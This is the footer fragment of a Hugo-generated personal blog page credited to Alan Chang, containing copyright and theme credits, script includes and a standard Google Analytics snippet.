        <i class="fa fa-twitter-square"></i>
    </a>
    


</div>

    
    <p class="small">
    
       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
    
    </p>
    <p class="small">
        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
    </p>
</footer>

        </section>

        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-88069322-2', 'auto');
	
	ga('send', 'pageview');
}
</script>





    </body>
</html>
